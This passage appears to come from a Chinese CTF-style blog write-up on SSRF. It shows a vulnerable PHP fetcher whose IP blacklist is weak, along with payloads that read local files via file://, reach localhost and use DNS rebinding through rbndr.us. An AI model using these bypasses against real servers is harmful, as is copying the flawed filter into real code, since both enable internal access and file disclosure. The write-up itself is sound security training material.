+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br><span class="line">?url=file:///var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_REQUEST[&#x27;url&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;</span><br><span class="line">    exit(&quot;hacker! Ban Intranet IP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>禁用了127，172，10，192，没有禁用localhost</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=localhost/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是这题要求用302跳转，后续再瞅瞅</p>
+<h4 id="【4】DNS重绑定-Bypass"><a href="#【4】DNS重绑定-Bypass" class="headerlink" title="【4】DNS重绑定 Bypass"></a>【4】DNS重绑定 Bypass</h4><p>上面的payload不行</p>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us DNS 重新绑定服务</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.7f000002.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>
+
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://syifna.github.io">syifna</a></p><p> <span>Link:  </span><a href="http://syifna.github.io/2025/03/31/ssrf/">http://syifna.github.io/2025/03/31/ssrf/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/04/04/php%E7%89%B9%E6%80%A7/" title="php特性"><span>< PreviousPost</span><br><span class="prevTitle">php特性</span></a><a class="nextSlogan" href="/2024/12/02/hello-world/" title="Hello World"><span>NextPost ></span><br><span class="nextTitle">Hello World</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">第一部分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%901%E3%80%91%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.0.1.</span> <span class="toc-text">【1】内网访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%902%E3%80%91%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.2.</span> <span class="toc-text">【2】伪协议读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%903%E3%80%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.0.3.</span> <span class="toc-text">【3】端口扫描</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%88Gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">第二部分（Gopher协议的利用）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%EF%BC%9A"><span class="toc-number">2.0.1.</span> <span class="toc-text">格式：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">2.0.1.1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#4%EF%BC%8C-gopher%E7%9A%84GET%E8%AF%B7%E6%B1%82"><span class="toc-number">2.0.1.1.1.</span> <span class="toc-text">4，\gopher的GET请求\</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5%EF%BC%8C-gopher%E7%9A%84POST%E8%AF%B7%E6%B1%82%EF%BC%9A"><span class="toc-number">2.0.1.1.2.</span> <span class="toc-text">5，\gopher的POST请求：\</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-number">2.0.1.1.3.</span> <span class="toc-text">注意：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%901%E3%80%91POST%E8%AF%B7%E6%B1%82"><span class="toc-number">2.0.2.</span> <span class="toc-text">【1】POST请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A-1"><span class="toc-number">2.0.3.</span> <span class="toc-text">注意：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%902%E3%80%91%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">2.0.4.</span> <span class="toc-text">【2】上传文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%903%E3%80%91FastCGI%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.0.5.</span> <span class="toc-text">【3】FastCGI协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%904%E3%80%91Redis%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.0.6.</span> <span class="toc-text">【4】Redis协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="toc-number">3.</span> <span class="toc-text">第三部分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%901%E3%80%91URL-Bypass"><span class="toc-number">3.0.1.</span> <span class="toc-text">【1】URL Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%902%E3%80%91%E6%95%B0%E5%AD%97IP-Bypass"><span class="toc-number">3.0.2.</span> <span class="toc-text">【2】数字IP Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%903%E3%80%91302%E8%B7%B3%E8%BD%AC-Bypass"><span class="toc-number">3.0.3.</span> <span class="toc-text">【3】302跳转 Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%904%E3%80%91DNS%E9%87%8D%E7%BB%91%E5%AE%9A-Bypass"><span class="toc-number">3.0.4.</span> <span class="toc-text">【4】DNS重绑定 Bypass</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
